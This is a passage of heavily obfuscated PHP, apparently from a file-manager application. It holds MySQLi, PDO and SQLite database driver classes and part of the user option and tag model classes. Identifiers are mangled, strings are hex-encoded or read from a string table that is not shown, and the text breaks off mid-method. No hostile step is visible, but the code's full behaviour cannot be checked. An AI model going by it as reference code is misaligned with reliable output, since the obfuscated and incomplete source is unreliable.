DbMysqli extends Db { public function __construct($ˆ°÷Ë©‡ = '') { $Ÿ—Ì«€© =& $_SERVER[§ŒØóıü]; if (!extension_loaded($Ÿ—Ì«€©[918])) { think_exception(think_lang($Ÿ—Ì«€©[14]) . $Ÿ—Ì«€©[919]); } if (!empty($ˆ°÷Ë©‡)) { $this->config = $ˆ°÷Ë©‡; if (empty($this->config[$Ÿ—Ì«€©[17]])) { $this->config[$Ÿ—Ì«€©[17]] = $Ÿ—Ì«€©[12]; } } } public function connect($…ÙÎ”–â = '', $ŞÔ¿ƒã = 0) { $ÙÈÇãÌ· =& $_SERVER[§ŒØóıü]; if (!isset($this->linkID[$ŞÔ¿ƒã])) { if (empty($…ÙÎ”–â)) { $…ÙÎ”–â = $this->config; } $this->linkID[$ŞÔ¿ƒã] = new mysqli($…ÙÎ”–â[$ÙÈÇãÌ·[892]], $…ÙÎ”–â[$ÙÈÇãÌ·[894]], $…ÙÎ”–â[$ÙÈÇãÌ·[895]], $…ÙÎ”–â[$ÙÈÇãÌ·[21]], $…ÙÎ”–â[$ÙÈÇãÌ·[893]] ? intval($…ÙÎ”–â[$ÙÈÇãÌ·[893]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $”ıÏ¦Ôª = $this->linkID[$ŞÔ¿ƒã]->server_version; $this->linkID[$ŞÔ¿ƒã]->query($ÙÈÇãÌ·[896] . think_config($ÙÈÇãÌ·[897]) . $ÙÈÇãÌ·[58]); if ($”ıÏ¦Ôª > $ÙÈÇãÌ·[898]) { $this->linkID[$ŞÔ¿ƒã]->query($ÙÈÇãÌ·[899]); } $this->connected = !0; if (1 != think_config($ÙÈÇãÌ·[22])) { unset($this->config); } } return $this->linkID[$ŞÔ¿ƒã]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($¥Ìü¿µÉ) { $¤á†Ü§ó =& $_SERVER[§ŒØóıü]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¥Ìü¿µÉ; if ($this->queryID) { $this->free(); } think_action_status($¤á†Ü§ó[23], 1); think_status($¤á†Ü§ó[24]); $this->queryID = $this->_linkID->query($¥Ìü¿µÉ); if ($this->_linkID->more_results()) { while (($—€Îû±‰ = $this->_linkID->next_result()) != NULL) { $—€Îû±‰->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ÉŠÂü€­) { $Ï‹şÏ¾É =& $_SERVER[§ŒØóıü]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÉŠÂü€­; if ($this->queryID) { $this->free(); } think_action_status($Ï‹şÏ¾É[25], 1); think_status($Ï‹şÏ¾É[24]); $Âè–é¤î = $this->_linkID->query($ÉŠÂü€­); $this->debug(); if (!1 === $Âè–é¤î) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ªÁ­çİ— = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ªÁ­çİ—) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $½ÊŞÖ“ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$½ÊŞÖ“) { $this->error(); return !1; } } return !0; } private function getAll() { $í–•õÕÖ = array(); if ($this->numRows > 0) { for ($²Û•Ø±á = 0; $²Û•Ø±á < $this->numRows; $²Û•Ø±á++) { $í–•õÕÖ[$²Û•Ø±á] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $í–•õÕÖ; } public function getFields($‡¦—ˆÉ±) { $º¸Ùß• =& $_SERVER[§ŒØóıü]; $¾²¥–˜– = $this->query($º¸Ùß•[903] . $this->parseKey($‡¦—ˆÉ±)); $ù÷‹Œ¦ = array(); if ($¾²¥–˜–) { foreach ($¾²¥–˜– as $‰©¥‰°£ => $‚îÙÂ¹´) { $ù÷‹Œ¦[$‚îÙÂ¹´[$º¸Ùß•[31]]] = array($º¸Ùß•[32] => $‚îÙÂ¹´[$º¸Ùß•[31]], $º¸Ùß•[33] => $‚îÙÂ¹´[$º¸Ùß•[34]], $º¸Ùß•[35] => (bool) ($‚îÙÂ¹´[$º¸Ùß•[36]] === $º¸Ùß•[12]), $º¸Ùß•[37] => $‚îÙÂ¹´[$º¸Ùß•[38]], $º¸Ùß•[39] => strtolower($‚îÙÂ¹´[$º¸Ùß•[40]]) == $º¸Ùß•[41], $º¸Ùß•[42] => strtolower($‚îÙÂ¹´[$º¸Ùß•[43]]) == $º¸Ùß•[44]); } } return $ù÷‹Œ¦; } public function getTables($‡¶¯Ù„ = '') { $‹ĞåÜ€ã =& $_SERVER[§ŒØóıü]; $ÃºÏ½ËÏ = !empty($‡¶¯Ù„) ? $‹ĞåÜ€ã[905] . $‡¶¯Ù„ . $‹ĞåÜ€ã[906] : $‹ĞåÜ€ã[907]; $Åéá˜œ = $this->query($ÃºÏ½ËÏ); $Á¹ïı‡ú = array(); if ($Åéá˜œ) { foreach ($Åéá˜œ as $¥Û¼æÏ¸ => $ïÌâÉ) { $Á¹ïı‡ú[$¥Û¼æÏ¸] = current($ïÌâÉ); } } return $Á¹ïı‡ú; } public function replace($¤Ê¶Ë á, $®òŠ¨áŸ = array()) { $ê³©¬‘» =& $_SERVER[§ŒØóıü]; foreach ($¤Ê¶Ë á as $ÁÃØº => $€ÃÜàÒ) { $µü¦Ï = $this->parseValue($€ÃÜàÒ); if (is_scalar($µü¦Ï)) { $×ÁÅÏÂş[] = $µü¦Ï; $Áë’Î³á[] = $this->parseKey($ÁÃØº); } } $Û»Ë™ = $ê³©¬‘»[908] . $this->parseTable($®òŠ¨áŸ[$ê³©¬‘»[279]]) . $ê³©¬‘»[909] . implode($ê³©¬‘»[50], $Áë’Î³á) . $ê³©¬‘»[910] . implode($ê³©¬‘»[50], $×ÁÅÏÂş) . $ê³©¬‘»[911]; return $this->execute($Û»Ë™); } public function insertAll($æ¡Ô¡¿ì, $„­ÆêÁµ = array(), $×Ø±¸ô¶ = false) { $Â†ê¯Î“ =& $_SERVER[§ŒØóıü]; if (!is_array($æ¡Ô¡¿ì[0])) { return !1; } $•áçÕÛ = array_keys($æ¡Ô¡¿ì[0]); $¿ÄÇìà = array(); foreach ($æ¡Ô¡¿ì as $Âıõ×Îâ) { $Ç¾çÉÇÓ = array(); foreach ($Âıõ×Îâ as $•¥¾¥åÙ => $ˆ ä½½) { $ˆ ä½½ = $this->parseValue($ˆ ä½½); if (is_scalar($ˆ ä½½)) { $Ç¾çÉÇÓ[] = $ˆ ä½½; } } $¿ÄÇìà[] = $Â†ê¯Î“[260] . implode($Â†ê¯Î“[50], $Ç¾çÉÇÓ) . $Â†ê¯Î“[911]; } array_walk($•áçÕÛ, array($this, $Â†ê¯Î“[912])); $÷ìÑş©Ä = $×Ø±¸ô¶ ? $Â†ê¯Î“[913] : $Â†ê¯Î“[914]; $ëğ§¨Ê¡ = $÷ìÑş©Ä . $Â†ê¯Î“[915] . $this->parseTable($„­ÆêÁµ[$Â†ê¯Î“[279]]) . $Â†ê¯Î“[909] . implode($Â†ê¯Î“[50], $•áçÕÛ) . $Â†ê¯Î“[916] . implode($Â†ê¯Î“[50], $¿ÄÇìà); return $this->execute($ëğ§¨Ê¡); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Ï¿ÛéÒ¦ =& $_SERVER[§ŒØóıü]; $this->error = $this->_linkID->errno . $Ï¿ÛéÒ¦[4] . $this->_linkID->error; if ($Ï¿ÛéÒ¦[12] != $this->queryStr) { $this->error .= LNG($Ï¿ÛéÒ¦[48]) . $this->queryStr; } think_trace($this->error, $Ï¿ÛéÒ¦[12], $Ï¿ÛéÒ¦[49]); return $this->error; } public function escapeString($¼õ£°Çâ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($¼õ£°Çâ); } else { return addslashes($¼õ£°Çâ); } } public function parseKey(&$¿ĞÊØï¹, $ÔÉ¶ç›ô = true) { $‹È‘èøÀ =& $_SERVER[§ŒØóıü]; if ($ÔÉ¶ç›ô) { $¿ĞÊØï¹ = $this->parseKeyCheck($¿ĞÊØï¹); } if ($¿ĞÊØï¹ != $‹È‘èøÀ[189] && !preg_match($‹È‘èøÀ[917], $¿ĞÊØï¹)) { $¿ĞÊØï¹ = $‹È‘èøÀ[385] . trim($¿ĞÊØï¹, $‹È‘èøÀ[385]) . $‹È‘èøÀ[385]; } return $¿ĞÊØï¹; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($²ŸâÀæ² = '') { $Ç¸ÆÜ˜ =& $_SERVER[§ŒØóıü]; if (!class_exists($Ç¸ÆÜ˜[920])) { think_exception(think_lang($Ç¸ÆÜ˜[14]) . $Ç¸ÆÜ˜[921]); } if (!empty($²ŸâÀæ²)) { $this->config = $²ŸâÀæ²; if (empty($this->config[$Ç¸ÆÜ˜[17]])) { $this->config[$Ç¸ÆÜ˜[17]] = array(); } } } public function connect($êªš½´· = '', $¶æ—Ûäå = 0) { $¸ãÛ²¦ =& $_SERVER[§ŒØóıü]; if (!isset($this->linkID[$¶æ—Ûäå])) { if (empty($êªš½´·)) { $êªš½´· = $this->config; } $ˆÂ«íöÉ = !empty($êªš½´·[$¸ãÛ²¦[17]][$¸ãÛ²¦[18]]) ? $êªš½´·[$¸ãÛ²¦[17]][$¸ãÛ²¦[18]] : $this->pconnect; if ($ˆÂ«íöÉ) { $êªš½´·[$¸ãÛ²¦[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$¶æ—Ûäå] = new PDO($êªš½´·[$¸ãÛ²¦[922]], $êªš½´·[$¸ãÛ²¦[894]], $êªš½´·[$¸ãÛ²¦[895]], $êªš½´·[$¸ãÛ²¦[17]]); } catch (PDOException $½ëõêµÉ) { think_exception($½ëõêµÉ->getMessage()); } $this->dbType = $this->_getDsnType($êªš½´·[$¸ãÛ²¦[922]]); if (in_array($this->dbType, array($¸ãÛ²¦[923], $¸ãÛ²¦[924], $¸ãÛ²¦[925], $¸ãÛ²¦[926]))) { think_exception($¸ãÛ²¦[927] . $this->dbType . $¸ãÛ²¦[928] . $this->dbType . $¸ãÛ²¦[929]); } if (!$this->linkID[$¶æ—Ûäå]) { think_exception($¸ãÛ²¦[930]); } try { $this->linkID[$¶æ—Ûäå]->exec($¸ãÛ²¦[931] . think_config($¸ãÛ²¦[897])); } catch (Exception $½ëõêµÉ) { } $this->connected = !0; if (1 != think_config($¸ãÛ²¦[22])) { unset($this->config); } } return $this->linkID[$¶æ—Ûäå]; } public function free() { $this->PDOStatement = null; } public function query($¤¢¦¸¼œ, $¨ÕÛÁü‡ = array()) { $Öñ‘µİ =& $_SERVER[§ŒØóıü]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¤¢¦¸¼œ; if (!empty($¨ÕÛÁü‡)) { $this->queryStr .= $Öñ‘µİ[932] . print_r($¨ÕÛÁü‡, !0) . $Öñ‘µİ[933]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Öñ‘µİ[23], 1); think_status($Öñ‘µİ[24]); $this->PDOStatement = $this->_linkID->prepare($¤¢¦¸¼œ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $÷Åç–ôğ = $this->PDOStatement->execute($¨ÕÛÁü‡); $this->debug(); if (!1 === $÷Åç–ôğ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($”Æ¯›ğ, $Û¾ß¨º = array()) { $Ô˜ÎÒ€ù =& $_SERVER[§ŒØóıü]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $”Æ¯›ğ; if (!empty($Û¾ß¨º)) { $this->queryStr .= $Ô˜ÎÒ€ù[932] . print_r($Û¾ß¨º, !0) . $Ô˜ÎÒ€ù[933]; } $êÔ·”æ© = !1; if ($this->dbType == $Ô˜ÎÒ€ù[926]) { if (preg_match($Ô˜ÎÒ€ù[934], $this->queryStr, $ŠÒ·—õ)) { $this->table = think_config($Ô˜ÎÒ€ù[935]) . str_ireplace(think_config($Ô˜ÎÒ€ù[936]), $Ô˜ÎÒ€ù[378], $ŠÒ·—õ[2]); $êÔ·”æ© = (bool) $this->query($Ô˜ÎÒ€ù[937] . strtoupper($this->table) . $Ô˜ÎÒ€ù[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Ô˜ÎÒ€ù[25], 1); think_status($Ô˜ÎÒ€ù[24]); $this->PDOStatement = $this->_linkID->prepare($”Æ¯›ğ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $»«®öÄÒ = $this->PDOStatement->execute($Û¾ß¨º); $this->debug(); if (!1 === $»«®öÄÒ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($êÔ·”æ© || preg_match($Ô˜ÎÒ€ù[938], $”Æ¯›ğ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¹éº å© = $this->_linkID->commit(); $this->transTimes = 0; if (!$¹éº å©) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $£æ¨ä½î = $this->_linkID->rollback(); $this->transTimes = 0; if (!$£æ¨ä½î) { $this->error(); return !1; } } return !0; } private function getAll() { $ã´„í¸Ä = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($ã´„í¸Ä); return $ã´„í¸Ä; } public function getFields($Ù•ÎØ…Î) { $ŒµÊ‰ƒ² =& $_SERVER[§ŒØóıü]; $this->initConnect(!0); if (think_config($ŒµÊ‰ƒ²[939])) { $ãßÉÆÜç = str_replace($ŒµÊ‰ƒ²[940], $Ù•ÎØ…Î, think_config($ŒµÊ‰ƒ²[939])); } else { switch ($this->dbType) { case $ŒµÊ‰ƒ²[923]: case $ŒµÊ‰ƒ²[941]: $ãßÉÆÜç = "\123\x45\114\105\x43\124\x20\40\40\143\157\154\165\x6d\x6e\137\x6e\141\155\x65\40\x61\x73\40\x27\x4e\x61\x6d\145\47\54\x20\40\40\144\x61\164\141\137\x74\171\x70\145\40\141\163\x20\47\x54\x79\x70\145\47\x2c\x20\40\x20\x63\x6f\x6c\x75\x6d\156\137\x64\x65\x66\141\x75\x6c\x74\40\x61\163\x20\47\x44\145\146\141\165\154\164\x27\54\40\x20\40\x69\163\x5f\x6e\x75\x6c\154\x61\x62\154\x65\x20\x61\163\40\47\x4e\165\x6c\154\x27\xa\11\x9\106\122\117\x4d\11\151\156\146\x6f\x72\155\x61\164\x69\x6f\x6e\x5f\163\x63\150\145\155\141\x2e\164\x61\x62\x6c\x65\x73\x20\101\x53\40\x74\12\11\x9\112\117\111\116\11\151\156\x66\x6f\162\155\141\164\151\157\x6e\x5f\163\143\x68\x65\155\x61\x2e\143\157\x6c\x75\x6d\156\163\x20\x41\x53\40\143\12\x9\11\x4f\116\x20\40\164\x2e\x74\141\142\x6c\x65\137\x63\141\164\x61\154\157\147\40\x3d\40\x63\x2e\x74\x61\142\154\x65\x5f\x63\x61\x74\x61\x6c\157\x67\xa\11\x9\x41\x4e\x44\40\164\56\164\141\x62\x6c\145\x5f\x73\x63\150\x65\x6d\x61\40\75\x20\x63\x2e\x74\x61\x62\x6c\x65\137\x73\143\x68\145\x6d\141\12\x9\x9\x41\116\x44\40\x74\56\x74\141\142\x6c\x65\x5f\156\x61\155\145\x20\75\x20\143\56\164\141\x62\154\145\x5f\156\141\155\145\12\x9\11\127\x48\105\x52\105\x20\40\40\x74\x2e\x74\x61\142\154\x65\137\x6e\141\x6d\145\40\x3d\40\47{$Ù•ÎØ…Î}\x27"; break; case $ŒµÊ‰ƒ²[942]: $ãßÉÆÜç = $ŒµÊ‰ƒ²[943] . $Ù•ÎØ…Î . $ŒµÊ‰ƒ²[944]; break; case $ŒµÊ‰ƒ²[924]: case $ŒµÊ‰ƒ²[926]: $ãßÉÆÜç = $ŒµÊ‰ƒ²[945] . $ŒµÊ‰ƒ²[946] . $ŒµÊ‰ƒ²[947] . strtoupper($Ù•ÎØ…Î) . $ŒµÊ‰ƒ²[948] . strtoupper($Ù•ÎØ…Î) . $ŒµÊ‰ƒ²[949]; break; case $ŒµÊ‰ƒ²[950]: $ãßÉÆÜç = $ŒµÊ‰ƒ²[951] . $Ù•ÎØ…Î . $ŒµÊ‰ƒ²[952]; break; case $ŒµÊ‰ƒ²[925]: break; case $ŒµÊ‰ƒ²[953]: default: $ãßÉÆÜç = $ŒµÊ‰ƒ²[954] . ($this->dbType == $ŒµÊ‰ƒ²[953] ? "\140{$Ù•ÎØ…Î}\x60" : $Ù•ÎØ…Î); } } $’‚Õåº = $this->query($ãßÉÆÜç); $ßà´”â = array(); if ($’‚Õåº) { foreach ($’‚Õåº as $úá ÛæÄ => $¯õÕŸ“Û) { $¯õÕŸ“Û = array_change_key_case($¯õÕŸ“Û); $¯õÕŸ“Û[$ŒµÊ‰ƒ²[32]] = isset($¯õÕŸ“Û[$ŒµÊ‰ƒ²[32]]) ? $¯õÕŸ“Û[$ŒµÊ‰ƒ²[32]] : $ŒµÊ‰ƒ²[378]; $¯õÕŸ“Û[$ŒµÊ‰ƒ²[33]] = isset($¯õÕŸ“Û[$ŒµÊ‰ƒ²[33]]) ? $¯õÕŸ“Û[$ŒµÊ‰ƒ²[33]] : $ŒµÊ‰ƒ²[378]; $‚¾Ïï™Ä = isset($¯õÕŸ“Û[$ŒµÊ‰ƒ²[273]]) ? $¯õÕŸ“Û[$ŒµÊ‰ƒ²[273]] : $¯õÕŸ“Û[$ŒµÊ‰ƒ²[32]]; $ßà´”â[$‚¾Ïï™Ä] = array($ŒµÊ‰ƒ²[32] => $‚¾Ïï™Ä, $ŒµÊ‰ƒ²[33] => $¯õÕŸ“Û[$ŒµÊ‰ƒ²[33]], $ŒµÊ‰ƒ²[35] => (bool) (isset($¯õÕŸ“Û[$ŒµÊ‰ƒ²[103]]) && $¯õÕŸ“Û[$ŒµÊ‰ƒ²[103]] === $ŒµÊ‰ƒ²[12] || isset($¯õÕŸ“Û[$ŒµÊ‰ƒ²[35]]) && $¯õÕŸ“Û[$ŒµÊ‰ƒ²[35]] === $ŒµÊ‰ƒ²[12]), $ŒµÊ‰ƒ²[37] => isset($¯õÕŸ“Û[$ŒµÊ‰ƒ²[37]]) ? $¯õÕŸ“Û[$ŒµÊ‰ƒ²[37]] : (isset($¯õÕŸ“Û[$ŒµÊ‰ƒ²[56]]) ? $¯õÕŸ“Û[$ŒµÊ‰ƒ²[56]] : $ŒµÊ‰ƒ²[378]), $ŒµÊ‰ƒ²[39] => isset($¯õÕŸ“Û[$ŒµÊ‰ƒ²[94]]) ? strtolower($¯õÕŸ“Û[$ŒµÊ‰ƒ²[94]]) == $ŒµÊ‰ƒ²[41] : (isset($¯õÕŸ“Û[$ŒµÊ‰ƒ²[57]]) ? $¯õÕŸ“Û[$ŒµÊ‰ƒ²[57]] : !1), $ŒµÊ‰ƒ²[42] => isset($¯õÕŸ“Û[$ŒµÊ‰ƒ²[955]]) ? strtolower($¯õÕŸ“Û[$ŒµÊ‰ƒ²[955]]) == $ŒµÊ‰ƒ²[44] : (isset($¯õÕŸ“Û[$ŒµÊ‰ƒ²[94]]) ? $¯õÕŸ“Û[$ŒµÊ‰ƒ²[94]] : !1)); } } return $ßà´”â; } public function getTables($ì“î±á¿ = '') { $§Â©™±¹ =& $_SERVER[§ŒØóıü]; if (think_config($§Â©™±¹[956])) { $÷±½°°º = str_replace($§Â©™±¹[957], $ì“î±á¿, think_config($§Â©™±¹[956])); } else { switch ($this->dbType) { case $§Â©™±¹[924]: case $§Â©™±¹[926]: $÷±½°°º = $§Â©™±¹[958]; break; case $§Â©™±¹[923]: case $§Â©™±¹[941]: $÷±½°°º = $§Â©™±¹[959]; break; case $§Â©™±¹[950]: $÷±½°°º = $§Â©™±¹[960]; break; case $§Â©™±¹[925]: think_exception(think_lang($§Â©™±¹[961]) . $§Â©™±¹[962]); break; case $§Â©™±¹[942]: $÷±½°°º = $§Â©™±¹[45] . $§Â©™±¹[46] . $§Â©™±¹[47]; break; case $§Â©™±¹[953]: default: if (!empty($ì“î±á¿)) { $÷±½°°º = $§Â©™±¹[905] . $ì“î±á¿ . $§Â©™±¹[906]; } else { $÷±½°°º = $§Â©™±¹[907]; } } } $—´Áá³“ = $this->query($÷±½°°º); $ê“Óªøî = array(); foreach ($—´Áá³“ as $¡ƒ¯¯ßÃ => $å€‚›Œí) { $ê“Óªøî[$¡ƒ¯¯ßÃ] = current($å€‚›Œí); } return $ê“Óªøî; } protected function parseLimit($×¤Õ‹ç³) { $‡‰“Ê¶± =& $_SERVER[§ŒØóıü]; $ÅŒ—ÔæÀ = $‡‰“Ê¶±[12]; if (!empty($×¤Õ‹ç³)) { switch ($this->dbType) { case $‡‰“Ê¶±[950]: case $‡‰“Ê¶±[942]: $×¤Õ‹ç³ = explode($‡‰“Ê¶±[50], $×¤Õ‹ç³); if (count($×¤Õ‹ç³) > 1) { $ÅŒ—ÔæÀ .= $‡‰“Ê¶±[51] . $×¤Õ‹ç³[1] . $‡‰“Ê¶±[52] . $×¤Õ‹ç³[0] . $‡‰“Ê¶±[53]; } else { $ÅŒ—ÔæÀ .= $‡‰“Ê¶±[51] . $×¤Õ‹ç³[0] . $‡‰“Ê¶±[53]; } break; case $‡‰“Ê¶±[923]: case $‡‰“Ê¶±[941]: break; case $‡‰“Ê¶±[925]: break; case $‡‰“Ê¶±[924]: case $‡‰“Ê¶±[926]: break; case $‡‰“Ê¶±[953]: default: $ÅŒ—ÔæÀ .= $‡‰“Ê¶±[51] . $×¤Õ‹ç³ . $‡‰“Ê¶±[53]; } } return $ÅŒ—ÔæÀ; } public function parseKey(&$¨”Õıõ, $‰Ë¥ª÷¯ = true) { $•Ì€²¼× =& $_SERVER[§ŒØóıü]; if ($‰Ë¥ª÷¯) { $¨”Õıõ = $this->parseKeyCheck($¨”Õıõ); } if ($this->dbType == $•Ì€²¼×[953]) { if ($¨”Õıõ != $•Ì€²¼×[189] && !preg_match($•Ì€²¼×[917], $¨”Õıõ)) { $¨”Õıõ = $•Ì€²¼×[385] . trim($¨”Õıõ, $•Ì€²¼×[385]) . $•Ì€²¼×[385]; } return $¨”Õıõ; } else { return parent::parseKey($¨”Õıõ, $‰Ë¥ª÷¯); } } public function close() { $this->_linkID = null; } public function error() { $¶Ø†ÜİÜ =& $_SERVER[§ŒØóıü]; if ($this->PDOStatement) { $ºÃåÎ‡á = $this->PDOStatement->errorInfo(); $this->error = $ºÃåÎ‡á[1] . $¶Ø†ÜİÜ[4] . $ºÃåÎ‡á[2]; } else { $this->error = $¶Ø†ÜİÜ[12]; } if ($¶Ø†ÜİÜ[12] != $this->queryStr) { $this->error .= LNG($¶Ø†ÜİÜ[48]) . $this->queryStr; } think_trace($this->error, $¶Ø†ÜİÜ[12], $¶Ø†ÜİÜ[49]); return $this->error; } public function escapeString($î¶ª÷¬Æ) { $şû¦Ì•š =& $_SERVER[§ŒØóıü]; switch ($this->dbType) { case $şû¦Ì•š[950]: case $şû¦Ì•š[923]: case $şû¦Ì•š[941]: case $şû¦Ì•š[953]: return addslashes($î¶ª÷¬Æ); case $şû¦Ì•š[925]: case $şû¦Ì•š[942]: case $şû¦Ì•š[924]: case $şû¦Ì•š[926]: return str_ireplace($şû¦Ì•š[58], $şû¦Ì•š[59], $î¶ª÷¬Æ); } } protected function parseValue($Šı°²Ù) { $ÉÜĞ”Î” =& $_SERVER[§ŒØóıü]; if (is_string($Šı°²Ù)) { $ÚÌ›·™ô = strpos($Šı°²Ù, $ÉÜĞ”Î”[4]) === 0 && in_array($Šı°²Ù, array_keys($this->bind)); $Šı°²Ù = $ÚÌ›·™ô ? $this->escapeString($Šı°²Ù) : $ÉÜĞ”Î”[963] . $this->escapeString($Šı°²Ù) . $ÉÜĞ”Î”[963]; } elseif (isset($Šı°²Ù[0]) && is_string($Šı°²Ù[0]) && strtolower($Šı°²Ù[0]) == $ÉÜĞ”Î”[297]) { $Šı°²Ù = $this->escapeString($Šı°²Ù[1]); } elseif (is_array($Šı°²Ù)) { $Šı°²Ù = array_map(array($this, $ÉÜĞ”Î”[964]), $Šı°²Ù); } elseif (is_bool($Šı°²Ù)) { $Šı°²Ù = $Šı°²Ù ? $ÉÜĞ”Î”[88] : $ÉÜĞ”Î”[198]; } elseif (is_null($Šı°²Ù)) { $Šı°²Ù = $ÉÜĞ”Î”[103]; } return $Šı°²Ù; } public function getLastInsertId() { $˜Ù¾ùÙ³ =& $_SERVER[§ŒØóıü]; switch ($this->dbType) { case $˜Ù¾ùÙ³[950]: case $˜Ù¾ùÙ³[942]: case $˜Ù¾ùÙ³[923]: case $˜Ù¾ùÙ³[941]: case $˜Ù¾ùÙ³[925]: case $˜Ù¾ùÙ³[953]: return $this->_linkID->lastInsertId(); case $˜Ù¾ùÙ³[924]: case $˜Ù¾ùÙ³[926]: $á¡¿üÈ = $this->table; $ÃØøû®´ = $this->query("\x53\x45\x4c\x45\103\x54\x20{$á¡¿üÈ}\x2e\143\x75\x72\162\x76\141\154\40\143\x75\162\x72\x76\141\x6c\40\106\x52\x4f\x4d\x20\x64\165\x61\x6c"); return $ÃØøû®´ ? $ÃØøû®´[0][$˜Ù¾ùÙ³[965]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($»­®ÚıÚ) { $È¦×ô³‹ =& $_SERVER[§ŒØóıü]; if (!CacheLock::fileLock($È¦×ô³‹[13])) { return !1; } $áã°£Âá = parent::query($»­®ÚıÚ); CacheLock::fileUnLock($È¦×ô³‹[13]); return $áã°£Âá; } public function execute($˜òŠ’ß£) { $÷Ç ë´û =& $_SERVER[§ŒØóıü]; if (!CacheLock::fileLock($÷Ç ë´û[13])) { return !1; } $Ûø…ò¦ = parent::execute($˜òŠ’ß£); CacheLock::fileUnLock($÷Ç ë´û[13]); return $Ûø…ò¦; } } goto c±À’íè†³; e²é‰İîØ‡: define($_SERVER[§ŒØóıü][238], 1); define($_SERVER[§ŒØóıü][239], 2); define($_SERVER[§ŒØóıü][240], 3); goto DÙÒ…ÁÈ»•; e¡Ã¢ï±Ã†: class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\x65\162\137\x6f\160\x74\151\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($ãÄªÀˆş) { return "\125\x73\x65\162\117\160\x74\x69\157\156\137{$ãÄªÀˆş}\137" . USER_ID; } protected function filterWhere($¸¨ßí†) { $¸¨ßí†[$_SERVER[§ŒØóıü][1673]] = USER_ID; return $¸¨ßí†; } public function cacheRemoveUser($ßúÖê¤Æ, $ŠßÍ²—£) { return Cache::remove("\125\x73\145\162\x4f\x70\164\151\157\x6e\x5f{$ßúÖê¤Æ}\x5f" . $ŠßÍ²—£); } protected function optionDefault($Öš‘¯ÛÌ = '') { $Æá›¼É„ =& $_SERVER[§ŒØóıü]; if ($Öš‘¯ÛÌ == $Æá›¼É„[12]) { return $GLOBALS[$Æá›¼É„[6]][$Æá›¼É„[2353]]; } if ($Öš‘¯ÛÌ == $Æá›¼É„[2354]) { return $GLOBALS[$Æá›¼É„[6]][$Æá›¼É„[2355]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\145\x72\56\x74\141\147\x4c\x69\x73\164"; public $modelType = "\125\163\x65\x72\117\160\164\151\x6f\156"; public $field = array("\156\x61\155\x65", "\x73\164\171\x6c\x65", "\x73\157\162\x74"); public function listData($‚•Ğ‚±Â = false, $Ã¼øõ‘Ò = "\x73\157\x72\164", $íÅë“¿ı = false) { return parent::listData($‚•Ğ‚±Â, $Ã¼øõ‘Ò, $íÅë“¿ı); } public function remove($Ùïßùî€) { return parent::remove($Ùïßùî€); } public function add($°È²¦ëú, $ÃğØıöÒ = "\x6c\141\142\145\x6c\55\x67\x72\x65\171\x2d\x6e\157\x72\155\x61\154") { $êÄÄ¯¯ =& $_SERVER[§ŒØóıü]; if ($this->findByName($°È²¦ëú)) { return !1; } $Ú€ çéÉ = array($êÄÄ¯¯[420] => $°È²¦ëú, $êÄÄ¯¯[484] => $ÃğØıöÒ, $êÄÄ¯¯[1866] => $this->getSort($êÄÄ¯¯[258]) + 1); return parent::insert($Ú€ çéÉ); } public function update($ô¼º‚êú, $Ë™¨¿±ø) { $Ìò½¹ =& $_SERVER[§ŒØóıü]; $–›éÛ„¹ = $this->listData($ô¼º‚êú); $›Ó‰ÖËó = $this->findByName($Ë™¨¿±ø[$Ìò½¹[32]]); if (!$–›éÛ„¹ || $›Ó‰ÖËó && $›Ó‰ÖËó[$Ìò½¹[399]] != $–›éÛ„¹[$Ìò½¹[399]]) { return !1; } return parent::update($ô¼º‚êú, $Ë™¨¿±ø); } public function moveTop($íÈÈåÏ) { $Á†¤È¡Ğ =& $_SERVER[§ŒØóıü]; $ãÌ÷ú•¾ = parent::listData(); $»òßå•è = $this->getSort($Á†¤È¡Ğ[257]); foreach ($ãÌ÷ú•¾ as &$Õ Š±Ğ) { if ($Õ Š±Ğ[$Á†¤È¡Ğ[399]] == $íÈÈåÏ) { $Õ Š±Ğ[$Á†¤È¡Ğ[1886]] = $»òßå•è; continue; } $Õ Š±Ğ[$Á†¤È¡Ğ[1886]] += 1; } unset($Õ Š±Ğ); return parent::resetData($ãÌ÷ú•¾); } public function 